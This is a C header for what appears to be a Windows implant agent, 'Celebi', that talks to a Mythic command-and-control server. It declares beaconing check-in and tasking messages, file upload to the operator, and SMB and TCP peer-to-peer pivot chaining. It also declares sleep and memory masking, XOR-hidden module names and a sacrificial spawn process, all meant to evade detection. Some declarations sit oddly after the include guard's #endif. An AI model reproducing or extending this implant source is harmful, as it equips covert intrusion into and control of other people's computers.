#ifndef CELEBI_H
#define CELEBI_H

#include "HTTP.h"

#define PARAM_BUFFER_LEN 4096
#define ENC_KEY_LEN       128

#define MESSAGE_TYPE_CHECKIN 1
#define MESSAGE_TYPE_TASKING 2
#define MESSAGE_TYPE_POST    3
#define MESSAGE_TYPE_UPLOAD  4
#define MESSAGE_TYPE_STAGING 5
#define MESSAGE_TYPE_STAGING_REPLY 6

#define FILE_CHUNK_SIZE (256 * 1024) /* download chunk; large so relayed transfers don't take hundreds of roundtrips */
#define MAXIMUM_POST_SIZE 1024
#define VAULT_INITIAL_SIZE 8192
#define VAULT_MAX_BUFFERS 1024

#define DEFAULT_SLEEP_TIME 5

#define STATUS_SUCCESS                    1
#define STATUS_CANNOT_RESOLVE_PICO        2
#define STATUS_MISSING_FILENAME           3
#define STATUS_DUPLICATE_FILENAME         4
#define STATUS_UPLOAD_FAILED              5
#define STATUS_VAULT_FULL                 6
#define STATUS_VAULT_REMOVAL_FAILED       7
#define STATUS_MISSING_COMMAND            8
#define STATUS_UNKNOWN_PICO               9
#define STATUS_UNKNOWN_COMMAND            10
#define STATUS_COMMAND_FAILED             11

// Macro for turning a defined constant into a string literal.
#define STR_(X) #X
#define STR(X) STR_(X)

/*
 *
 * Parameters
 *
*/

typedef struct AgentParams {
	char *payload_uuid;
	char *callback_uuid;
	char *callback_host;
	int callback_port;
	int callback_https;
	char *callback_uri;      /* post_uri */
	char *get_uri;
	char *query_path_name;
	int callback_interval;
	int callback_jitter;
	char *killdate;
	char *headers;
	char *proxy_host;
	int proxy_port;
	char *proxy_user;
	char *proxy_pass;
	char *aes_value;
	char *aes_key;          /* base64 32-byte key, empty when crypto is none */
	char *encrypted_exchange_check; /* "true" to perform RSA EKE before checkin */
	char *pipename;    /* smb profile: named pipe name */
	char *p2p_profile; /* "none", "smb" or "tcp" */
	int p2p_port;      /* tcp profile: bind port */
} AgentParams;

/*
 *
 * Messages
 *
*/

typedef struct CheckinRequest {
	char *payload_uuid;
	unsigned int pid;
	char *username;
	char *hostname;
	char *domain;
	char *ip; /* local IPv4 of the host (optional) */
} CheckinRequest;

typedef struct CheckinReply {
	char action;
	char *callback_uuid;
	char *status;
} CheckinReply;

typedef struct TaskInfo {
	char *id;
	char *command;
	char *parameters;
	int timestamp;
} TaskInfo;

typedef struct TaskingRequest {
	char *callback_uuid;
	char tasking_size;
	/* p2p: delegate messages to relay to Mythic (parent side) */
	int delegate_count;
	char **delegate_uuids;
	char **delegate_profiles;
	char **delegate_msgs;
	/* p2p: callback graph edge updates to report (parent side) */
	int edge_count;
	char **edge_sources;
	char **edge_dests;
	char **edge_actions;
	char **edge_profiles;
} TaskingRequest;

typedef struct TaskingReply {
	char action;
	char tasking_size;
	TaskInfo *tasks;
	/* p2p: delegate responses from Mythic (parent side) */
	int delegate_count;
	char **delegate_uuids;
	char **delegate_msgs;
	char **delegate_new_uuids;
} TaskingReply;

typedef struct TaskPostRequest {
	char *callback_uuid;
	char *task_id;
	char *task_output;
	char *task_status;
	BOOL completed;
} TaskPostRequest;

typedef struct TaskPostReply {
	int success;
} TaskPostReply;

typedef struct UploadManager {
	char *callback_uuid;
	char *task_id;
	char *file_uuid;
	unsigned int chunk_size;
	int next_chunk;
	char *current_buffer;
	size_t buflen; // current length of data within buffer
	size_t bufsize; // current capacity of buffer
	BOOL finished;
	BOOL error;
} UploadManager;

/*
 *
 * Vault
 *
*/

typedef struct DataBuffer {
	char  *name;
	size_t buffer_offset;
	size_t buffer_size;
} DataBuffer;

typedef struct DataVault {
	char *data;
	size_t data_size;
	size_t data_len;
	DataBuffer *buffers;
	size_t buffer_count;
} DataVault;

/*
 *
 * PICOs
 *
*/

typedef void (*CHECKIN_PICO)(CheckinRequest *req);
typedef char *(*WHOAMI_PICO)();
typedef void (*MASK_VAULT_PICO)(char *vault, int vault_size, char *key, int keylen);
typedef void (*MASK_SLEEP_PICO)(char *pic, int sleep_time, char *key, int keylen);
typedef char *(*GENERIC_PICO)(char *cmdline, size_t len);

typedef struct {
    __typeof__(LoadLibraryA)   * LoadLibraryA;
    __typeof__(GetProcAddress) * GetProcAddress;
    __typeof__(VirtualAlloc)   * VirtualAlloc;
    __typeof__(VirtualFree)    * VirtualFree;
} WIN32FUNCS;

typedef struct _EMBEDDED_PICO {
    int   length;
    char  value[];
} _EMBEDDED_PICO;

typedef struct ResolvedPico {
	char *code;
	char *data;
	size_t codelen;
	size_t datalen;
	void *entrypoint;
} ResolvedPico;

typedef struct BuiltinPicos {
	char *checkin;
	char *whoami;
	char *mask_vault;
	char *mask_sleep;
} BuiltinPicos;

/*
 *
 * State Management
 *
*/

/*
 *
 * P2P (smb/tcp)
 *
*/

typedef enum {
	P2P_TYPE_NONE = 0,
	P2P_TYPE_SMB,
	P2P_TYPE_TCP
} P2P_TYPE;

/* A p2p peer: a linked child (downlink) or, for p2p children, the uplink
 * channel to the parent. Agents may hold many links to chain pivots. */
typedef struct P2P_PEER {
	int active;           /* channel is up */
	P2P_TYPE type;        /* transport in use */
	char *profile;        /* profile name: "smb" or "tcp" */
	char *host;           /* link target host (downlinks) */
	HANDLE pipe;          /* smb: server (child) or client (parent) handle */
	SOCKET sock;          /* tcp: connected socket */
	char *local_uuid;     /* parent side: uuid used to label this child in delegates */
	char *mythic_uuid;    /* parent side: child's real callback uuid (from new_uuid) */
	char **in_queue;      /* messages received from the peer, awaiting Mythic (parent) */
	int in_count;
	int in_cap;
	char **out_queue;     /* Mythic delegate responses awaiting the peer (parent) */
	int out_count;
	int out_cap;
} P2P_PEER;

/* One pending callback-graph edge update, flushed with the next get_tasking. */
typedef struct PendingEdge {
	char *source;
	char *destination;
	char *action;
	char *c2_profile;
} PendingEdge;

/* Zero a struct without external memset (PIC-safe). */
#define ZeroMemoryStruct(p, sz) do { \
	char *_z = (char *)(p); \
	for (size_t _i = 0; _i < (sz); _i++) _z[_i] = 0; \
} while (0)

typedef struct AgentState {
	HttpHandle *http;
	AgentParams params;
	DataVault file_vault;
	BuiltinPicos builtin_picos;
	WIN32FUNCS funcs;
	int sleep_time;
	int crypto_enabled;
	unsigned char aes_key[32];
	char *staging_uuid; /* tempUUID from RSA EKE, used as the checkin envelope uuid */
	int is_p2p_child;   /* this agent binds a smb/tcp server and speaks Mythic over it */
	char *spawnto;      /* sacrificial process path for the spawn command */
	P2P_PEER p2p_peer;  /* p2p child: the accepted uplink channel carrying own traffic */
	P2P_PEER **links;   /* linked children (downlinks); any agent can hold several */
	int link_count;
	int link_cap;
	PendingEdge *pending_edges; /* edge updates flushed with the next get_tasking */
	int pending_edge_count;
	int pending_edge_cap;
} AgentState;

/*
 *
 * Function Signatures
 *
*/

void crypto_random_bytes(unsigned char *buf, size_t len);
/* Load a DLL whose name is stored XOR-encoded (no plaintext module names in the PIC). */
void *load_module_xor(const unsigned char *encoded, int encoded_len, unsigned char key);
char *agent_unescape_crlf(const char *in);
unsigned char *crypto_aes256_hmac_encrypt(const unsigned char key[32], const unsigned char *msg, size_t msg_len, size_t *out_len);
unsigned char *crypto_aes256_hmac_decrypt(const unsigned char key[32], const unsigned char *in, size_t in_len, size_t *out_len);
void base64_url_encode(const char *in, const unsigned long in_len, char *out);
int apply_jitter(int base, int pct);

/* p2p.c */
void p2p_gen_uuid(char out[37]);
int p2p_server_start(P2P_PEER *peer, AgentParams *params);
int p2p_client_connect(P2P_PEER *peer, const char *host, const char *profile, const char *pipename, int port);
int p2p_send(P2P_PEER *peer, const char *b64msg);
char *p2p_recv(P2P_PEER *peer);
char *p2p_recv_timeout(P2P_PEER *peer, int timeout_seconds);
char *p2p_poll(P2P_PEER *peer);
int p2p_flush(P2P_PEER *peer);
void p2p_close(P2P_PEER *peer);
void p2p_queue_out(P2P_PEER *peer, char *msg);
void peer_queue_in(P2P_PEER *peer, char *msg);
char *p2p_pop_in(P2P_PEER *peer);

/* How long a p2p child waits for the reply to one of its messages before
 * failing the exchange (a lost delegate reply must not wedge the agent). */
#define P2P_RECV_TIMEOUT_SEC 45

typedef LONG NTSTATUS;
typedef void *BCRYPT_ALG_HANDLE;
typedef void *BCRYPT_KEY_HANDLE;
typedef struct EKE_RSA {
	BCRYPT_ALG_HANDLE alg;
	BCRYPT_KEY_HANDLE key;
	char *pubkey_b64; /* base64 of PKCS#1 RSAPublicKey DER */
} EKE_RSA;
int eke_pubkey_b64_from_blob(const unsigned char *blob, unsigned long blob_len, char *out_b64, int out_cap);
int eke_init(EKE_RSA *rsa);
int eke_decrypt_session_key(EKE_RSA *rsa, const char *session_key_b64, unsigned char out[32]);
void eke_cleanup(EKE_RSA *rsa);

void append_str(char *string, char *append);
char *clone_str(char *orig);
void base64_encode(const char *in, const unsigned long in_len, char *out);
int base64_decode(const char *in, const unsigned long in_len, char *out);
void xorify(char *out, char *in, size_t buflen, char *key, size_t keylen);

char *generate_checkin_message(CheckinRequest *checkin, int *msg_len);
char *generate_staging_message(const char *session_id, const char *pubkey_b64, int *msg_len);
void parse_staging_reply(char *decoded_body, int body_len, char *temp_uuid_out, int uuid_cap,
                         char *session_key_out, int key_cap, char *session_id_out, int id_cap);
BOOL perform_staging(AgentState *state, EKE_RSA *rsa, char *temp_uuid_out, int uuid_cap,
                     char *session_key_out, int key_cap);
FARPROC resolve_unloaded(char *mod, char *func);
void parse_checkin_reply(char *decoded_body, int body_len, CheckinReply *reply);
void free_checkin_request(CheckinRequest *request);
void free_checkin_reply(CheckinReply *reply);
BOOL perform_checkin(AgentState *state, CheckinReply *reply);

char *generate_tasking_message(TaskingRequest *tasking, int *msg_len);
void parse_tasking_reply(char *decoded_body, int body_len, TaskingReply *reply);
void free_tasking_request(TaskingRequest *request);
void free_tasking_reply(TaskingReply *reply);
BOOL perform_tasking(AgentState *state, TaskingReply *reply);

char *generate_post_message(TaskPostRequest *post, int *msg_len);
void free_post_request(TaskPostRequest *request);
BOOL perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status, BOOL completed);

UploadManager initialise_upload_manager(char *callback_uuid, char *task_id, char *file_uuid);
char *generate_upload_message(UploadManager *upload, int *msg_len);
void free_upload_manager(UploadManager *upload);
BOOL perform_upload(AgentState *stage, UploadManager *upload);

void pack_char(char *buf, int *offset, char paydata);
void pack_uint(char *buf, int *offset, unsigned int paydata);
void pack_string(char *buf, int *offset, char *paydata);
char unpack_char(char *buf, int *offset);
int unpack_int(char *buf, int *offset);
unsigned int unpack_uint(char *buf, int *offset);
char *unpack_str(char *buf, int *offset);
void unpack_params(char *enc_params, char *key, int keylen, AgentParams *params);
void free_params(AgentParams *params);

#endif /* CELEBI_H */

WIN32FUNCS resolve_pico_functions();
BuiltinPicos load_builtin_picos(DataVault *vault, char *key, int keylen);
BOOL resolve_loaded_pico(DataVault *vault, WIN32FUNCS *funcs, ResolvedPico *pico, char *key);
void free_resolved_pico(ResolvedPico *pico);

DataVault new_vault();
void extend_vault(DataVault *vault, size_t new_size);
void free_vault(DataVault *vault);
BOOL is_in_vault(DataVault *vault, char *key);
BOOL add_to_vault(DataVault *vault, char *name, char *buf, size_t buflen);
BOOL retrieve_from_vault(DataVault *vault, DataBuffer *out, char *key);
BOOL remove_from_vault(DataVault *vault, char *key);
char *resolve_databuffer(DataVault *vault, DataBuffer *databuf);
